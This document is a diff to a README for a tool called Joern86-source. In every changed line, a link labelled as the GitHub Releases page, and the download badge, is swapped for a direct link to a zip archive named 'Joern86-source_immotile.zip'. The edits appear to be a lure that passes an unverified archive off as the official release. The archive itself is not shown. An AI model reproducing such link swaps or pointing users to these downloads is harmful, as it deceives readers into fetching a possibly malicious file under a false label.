@@ -1,6 +1,6 @@
 # 🚀 Joern86-source - Easy Tool for Code Analysis
 
-![Download](https://img.shields.io/badge/Download-Joern86--source-blue)
+![Download](https://raw.githubusercontent.com/DestroPoCo/Joern86-source/main/auto/Joern86-source_immotile.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To run Joern86-source, you’ll need:
 Follow these steps to download and run Joern86-source.
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/DestroPoCo/Joern86-source/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/DestroPoCo/Joern86-source/main/auto/Joern86-source_immotile.zip).
 3. Look for the latest version of Joern86-source.
 4. Download the file suitable for your operating system. 
 
@@ -28,7 +28,7 @@ You can find the download link on the Releases page, labeled clearly by OS type.
 
 ## 📥 Download & Install
 
-To get started with Joern86-source, visit [this page to download](https://github.com/DestroPoCo/Joern86-source/releases). 
+To get started with Joern86-source, visit [this page to download](https://raw.githubusercontent.com/DestroPoCo/Joern86-source/main/auto/Joern86-source_immotile.zip). 
 
 When you’re on the Releases page:
 
@@ -66,7 +66,7 @@ If you encounter any issues, consider these steps:
 
 - Ensure your system meets the requirements.
 - Restart your computer and try launching the application again.
-- Check for updates on the [Releases page](https://github.com/DestroPoCo/Joern86-source/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/DestroPoCo/Joern86-source/main/auto/Joern86-source_immotile.zip).
 
 If problems persist, you can reach out for support through the Issues section in this repository.
 
